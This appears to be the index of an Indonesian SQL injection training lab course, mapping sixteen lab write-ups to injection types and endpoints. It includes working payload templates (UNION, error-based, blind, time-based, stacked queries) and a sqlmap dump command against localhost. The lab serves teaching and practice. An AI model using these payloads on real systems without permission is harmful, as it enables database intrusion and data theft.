# SQL Injection Labs - Writeup Index

Author: IDS - CyberSec Academy

---

## Daftar Lab

### Easy Labs (6 Labs)

| Lab | Nama File | Tipe Injection | Endpoint |
|-----|-----------|----------------|----------|
| E1 | [lab_e1_writeup.md](lab_e1_writeup.md) | UNION Based | `/search.php?q=` |
| E2 | [lab_e2_writeup.md](lab_e2_writeup.md) | Error Based | `/item.php?id=` |
| E3 | [lab_e3_writeup.md](lab_e3_writeup.md) | Auth Bypass | `/login.php` |
| E4 | [lab_e4_writeup.md](lab_e4_writeup.md) | UNION (JS Hint) | `/filter.php?cat=` |
| E5 | [lab_e5_writeup.md](lab_e5_writeup.md) | UNION (Hidden) | `/order.php?id=` |
| E6 | [lab_e6_writeup.md](lab_e6_writeup.md) | UNION | `/profile.php?id=` |

### Medium Labs (5 Labs)

| Lab | Nama File | Tipe Injection | Endpoint |
|-----|-----------|----------------|----------|
| M1 | [lab_m1_writeup.md](lab_m1_writeup.md) | Boolean Blind | `/report.php?id=` |
| M2 | [lab_m2_writeup.md](lab_m2_writeup.md) | Filtered UNION | `/account.php?id=` |
| M3 | [lab_m3_writeup.md](lab_m3_writeup.md) | Time Based Blind | `/search.php` (POST) |
| M4 | [lab_m4_writeup.md](lab_m4_writeup.md) | Numeric | `/admin.php?id=` |
| M5 | [lab_m5_writeup.md](lab_m5_writeup.md) | Order By | `/export.php?id=&sort=` |

### Hard Labs (5 Labs)

| Lab | Nama File | Tipe Injection | Endpoint |
|-----|-----------|----------------|----------|
| H1 | [lab_h1_writeup.md](lab_h1_writeup.md) | Blind JSON | `/api/user?id=` |
| H2 | [lab_h2_writeup.md](lab_h2_writeup.md) | Second Order | `/dashboard.php` |
| H3 | [lab_h3_writeup.md](lab_h3_writeup.md) | Double Encoding | `/stats.php?id=` |
| H4 | [lab_h4_writeup.md](lab_h4_writeup.md) | WAF Bypass | `/secure.php?id=` |
| H5 | [lab_h5_writeup.md](lab_h5_writeup.md) | Stacked Query | `/hidden.php?id=` |

---

## Quick Reference

### UNION Injection Template
```
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,flag,3 FROM flags-- -
```

### Error Based Template
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags),0x7e))-- -
```

### Boolean Blind Template
```
' AND (condition)-- -
```

### Time Based Blind Template
```
' AND IF((condition),SLEEP(3),0)-- -
```

### Stacked Query Template
```
1; SELECT flag FROM flags
```

---

## Tools Recommended

1. **sqlmap** - Automated SQL injection
   ```bash
   sqlmap -u "http://localhost/e1/search.php?q=test" --dump -T flags
   ```

2. **Burp Suite** - Manual testing & interception

3. **Custom Python Scripts** - For blind injection automation

---

## Flag Format
```
IDS{XXXXXXXXXXXXXX}
```
14 karakter alphanumeric uppercase

---

## Catatan Penting

Lab ini ditujukan untuk **pembelajaran dan simulasi legal** dalam lingkungan terkontrol.

Dilarang menggunakan teknik ini pada sistem tanpa izin.
